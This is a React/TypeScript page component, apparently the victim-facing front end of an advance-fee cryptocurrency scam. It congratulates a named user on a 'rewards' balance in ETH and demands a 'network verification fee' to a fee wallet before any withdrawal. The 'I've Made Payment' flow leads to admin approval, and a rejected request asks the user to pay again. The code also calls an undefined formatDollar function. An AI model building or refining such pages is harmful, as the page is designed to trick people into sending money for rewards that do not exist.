import { useRoute } from "wouter";
import { useUser } from "@/hooks/use-users";
import { useWithdrawalRequest, useSubmitWithdrawalRequest } from "@/hooks/use-withdrawal";
import { UserLayout } from "@/components/layout/user-layout";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { formatEth, truncateWallet } from "@/lib/utils";
import { Copy, Wallet, ArrowDownCircle, Info, CheckCircle2, Clock, XCircle, Send } from "lucide-react";
import { motion } from "framer-motion";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";
import { getGetWithdrawalRequestQueryKey } from "@workspace/api-client-react";

export default function UserCongrats() {
  const [, params] = useRoute("/u/:slug");
  const slug = params?.slug || "";
  const { data: user, isLoading, isError } = useUser(slug);
  const { data: withdrawalRequest, isLoading: wrLoading } = useWithdrawalRequest(slug);
  const submitWithdrawal = useSubmitWithdrawalRequest(slug);
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const [copied, setCopied] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState<string>("");

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmitPayment = async () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount <= 0) {
      toast({ title: "Enter a valid amount", variant: "destructive" });
      return;
    }
    if (user && amount > user.eligibleBalance) {
      toast({ title: "Amount exceeds your eligible balance", variant: "destructive" });
      return;
    }
  
    try {
      const res = await fetch(`/api/withdrawal-requests/${slug}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestedAmount: amount }),
      });
  
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || "Failed to submit");
      }
  
      // 🔥 This makes the admin page see the new request instantly
      queryClient.invalidateQueries({ queryKey: getGetWithdrawalRequestQueryKey(slug) });
  
      toast({
        title: "Payment notification sent!",
        description: "Waiting for admin verification.",
      });
      setWithdrawAmount("");
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message || "Something went wrong",
        variant: "destructive",
      });
    }
  };
  
  if (isLoading || wrLoading) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center">
          <div className="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin" />
        </div>
      </UserLayout>
    );
  }

  if (isError || !user) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center p-6 text-center">
          <Card className="max-w-md w-full">
            <CardContent className="pt-6">
              <h2 className="text-2xl font-bold text-destructive mb-2">Account Not Found</h2>
              <p className="text-muted-foreground">The personalized link you followed is invalid or has expired.</p>
            </CardContent>
          </Card>
        </div>
      </UserLayout>
    );
  }

  const hasPendingRequest = withdrawalRequest?.status === "pending";
  const hasVerifiedRequest = withdrawalRequest?.status === "verified";
  const hasRejectedRequest = withdrawalRequest?.status === "rejected";

  return (
    <UserLayout slug={slug}>
      <div className="max-w-3xl mx-auto px-4 sm:px-6 pt-12 pb-24 space-y-8">

        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-center space-y-4"
        >
          <div className="inline-flex items-center justify-center p-3 bg-primary/10 rounded-full mb-4 shadow-[0_0_30px_rgba(34,211,238,0.2)]">
            <Wallet className="w-8 h-8 text-primary" />
          </div>
          <h1 className="text-4xl md:text-5xl lg:text-6xl font-display font-bold">
            Congratulations, <span className="text-gradient">{user.name}</span>!
          </h1>
          <p className="text-lg text-muted-foreground max-w-xl mx-auto">
            Your rewards are ready. Follow the instructions below to complete your withdrawal.
          </p>
        </motion.div>

        {/* Balance card */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.1 }}
        >
          <Card className="overflow-hidden border-primary/20 shadow-[0_0_50px_rgba(34,211,238,0.05)]">
            <div className="bg-gradient-to-r from-primary/10 to-transparent p-6 text-center border-b border-white/5">
              <p className="text-sm font-medium text-primary uppercase tracking-widest mb-2">Available Balance</p>
              <h2 className="text-5xl md:text-6xl font-display font-bold text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.5)]">
                {formatDollar(user.eligibleBalance)} worth of ETH
              </h2>
            </div>

            <CardContent className="p-6 md:p-8 space-y-6">
              {/* Connected wallet */}
              <div className="flex flex-col sm:flex-row items-center justify-between p-4 rounded-xl bg-white/5 border border-white/10 gap-4">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-secondary flex items-center justify-center">
                    <ArrowDownCircle className="w-5 h-5 text-muted-foreground" />
                  </div>
                  <div className="text-left">
                    <p className="text-sm text-muted-foreground">Connected Wallet</p>
                    <p className="font-mono text-sm md:text-base">{truncateWallet(user.walletAddress)}</p>
                  </div>
                </div>
                <Button variant="secondary" size="sm" onClick={() => copyToClipboard(user.walletAddress)} className="w-full sm:w-auto">
                  {copied ? <CheckCircle2 className="w-4 h-4 mr-2 text-green-400" /> : <Copy className="w-4 h-4 mr-2" />}
                  {copied ? "Copied" : "Copy Address"}
                </Button>
              </div>

              {/* Fee instructions */}
              <div className="rounded-xl border border-amber-500/30 bg-amber-500/10 p-6 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-1 h-full bg-amber-500 shadow-[0_0_10px_rgba(245,158,11,0.8)]" />
                <div className="flex items-start gap-4">
                  <Info className="w-6 h-6 text-amber-400 shrink-0 mt-0.5" />
                  <div className="space-y-3">
                    <h3 className="text-lg font-semibold text-white">Withdrawal Fee Required</h3>
                    <p className="text-muted-foreground leading-relaxed">
                      To unlock your withdrawal, send a network verification fee of{" "}
                      <strong className="text-amber-400">{formatEth(user.withdrawalFeeEth)}</strong> to the address below.
                    </p>
                    <div className="flex items-center justify-between gap-3 p-4 bg-black/40 rounded-lg border border-white/5">
                      <div className="min-w-0">
                        <p className="text-xs text-muted-foreground mb-1 uppercase tracking-wider">Send fee to:</p>
                        <p className="font-mono text-sm text-primary break-all">{user.feeWalletAddress}</p>
                      </div>
                      <Button
                        variant="ghost"
                        size="icon"
                        className="shrink-0 h-8 w-8"
                        onClick={() => copyToClipboard(user.feeWalletAddress)}
                      >
                        <Copy className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Withdrawal amount selector + payment button */}
              {hasVerifiedRequest ? (
                <motion.div
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="rounded-xl border border-green-500/40 bg-green-500/10 p-6 flex items-center gap-4"
                >
                  <CheckCircle2 className="w-8 h-8 text-green-400 shrink-0" />
                  <div>
                    <p className="text-lg font-semibold text-green-300">Payment Verified!</p>
                    <p className="text-sm text-muted-foreground mt-1">
                      Your withdrawal of <strong className="text-white">{formatEth(withdrawalRequest!.requestedAmount)}</strong> has been verified and is being processed.
                    </p>
                  </div>
                </motion.div>
              ) : hasRejectedRequest ? (
                <motion.div
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="rounded-xl border border-destructive/40 bg-destructive/10 p-6"
                >
                  <div className="flex items-center gap-3 mb-3">
                    <XCircle className="w-6 h-6 text-destructive shrink-0" />
                    <p className="text-lg font-semibold text-destructive">Payment Not Verified</p>
                  </div>
                  <p className="text-sm text-muted-foreground mb-4">
                    Your previous payment could not be verified. Please ensure you sent the exact fee amount to the correct address, then try again.
                  </p>
                  <WithdrawalForm
                    user={user}
                    withdrawAmount={withdrawAmount}
                    setWithdrawAmount={setWithdrawAmount}
                    onSubmit={handleSubmitPayment}
                    isPending={submitWithdrawal.isPending}
                  />
                </motion.div>
              ) : hasPendingRequest ? (
                <motion.div
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="rounded-xl border border-primary/30 bg-primary/5 p-6 flex items-center gap-4"
                >
                  <Clock className="w-8 h-8 text-primary shrink-0 animate-pulse" />
                  <div>
                    <p className="text-lg font-semibold text-primary">Awaiting Verification</p>
                    <p className="text-sm text-muted-foreground mt-1">
                      Your payment notification for{" "}
                      <strong className="text-white">{formatEth(withdrawalRequest!.requestedAmount)}</strong> has been submitted.
                      Please wait while an admin verifies your transaction.
                    </p>
                  </div>
                </motion.div>
              ) : (
                <WithdrawalForm
                  user={user}
                  withdrawAmount={withdrawAmount}
                  setWithdrawAmount={setWithdrawAmount}
                  onSubmit={handleSubmitPayment}
                  isPending={submitWithdrawal.isPending}
                />
              )}
            </CardContent>
          </Card>
        </motion.div>
      </div>
    </UserLayout>
  );
}

function WithdrawalForm({
  user,
  withdrawAmount,
  setWithdrawAmount,
  onSubmit,
  isPending,
}: {
  user: any;
  withdrawAmount: string;
  setWithdrawAmount: (v: string) => void;
  onSubmit: () => void;
  isPending: boolean;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.2 }}
      className="rounded-xl border border-primary/20 bg-primary/5 p-6 space-y-4"
    >
      <h3 className="text-base font-semibold text-white flex items-center gap-2">
        <Send className="w-4 h-4 text-primary" />
        Request Withdrawal
      </h3>

      <div className="space-y-2">
        <label className="text-sm text-muted-foreground">
          Amount to Withdraw (ETH) — max {user.eligibleBalance} ETH
        </label>
        <div className="flex items-center gap-3">
          <input
            type="number"
            min="0.0001"
            max={user.eligibleBalance}
            step="0.0001"
            value={withdrawAmount}
            onChange={(e) => setWithdrawAmount(e.target.value)}
            placeholder={`0.0000 – ${user.eligibleBalance}`}
            className="flex-1 h-11 rounded-xl border border-white/10 bg-background px-3 text-sm font-mono text-white placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
          />
          <Button
            variant="ghost"
            size="sm"
            className="text-primary border border-primary/30 hover:bg-primary/10"
            onClick={() => setWithdrawAmount(String(user.eligibleBalance))}
          >
            Max
          </Button>
        </div>
        {/* Slider */}
        <input
          type="range"
          min="0"
          max={user.eligibleBalance}
          step="0.0001"
          value={withdrawAmount || 0}
          onChange={(e) => setWithdrawAmount(e.target.value)}
          className="w-full accent-primary cursor-pointer"
        />
        <div className="flex justify-between text-xs text-muted-foreground">
          <span>0 ETH</span>
          <span>{user.eligibleBalance} ETH</span>
        </div>
      </div>

      <div className="rounded-lg bg-black/30 border border-white/5 p-3 text-sm text-muted-foreground space-y-1">
        <div className="flex justify-between">
          <span>Withdrawal amount</span>
          <span className="text-white font-mono">{withdrawAmount ? parseFloat(withdrawAmount).toFixed(4) : "0.0000"} ETH</span>
        </div>
        <div className="flex justify-between">
          <span>Fee required</span>
          <span className="text-amber-400 font-mono">{user.withdrawalFeeEth} ETH</span>
        </div>
      </div>

      <Button
        className="w-full"
        size="lg"
        onClick={onSubmit}
        disabled={isPending || !withdrawAmount || parseFloat(withdrawAmount) <= 0}
      >
        {isPending ? (
          <span className="flex items-center gap-2">
            <div className="w-4 h-4 border-2 border-current border-t-transparent rounded-full animate-spin" />
            Submitting...
          </span>
        ) : (
          <span className="flex items-center gap-2">
            <CheckCircle2 className="w-5 h-5" />
            I've Made Payment
          </span>
        )}
      </Button>
      <p className="text-xs text-center text-muted-foreground">
        By clicking this button you confirm you have sent the required fee to the address above.
      </p>
    </motion.div>
  );
}
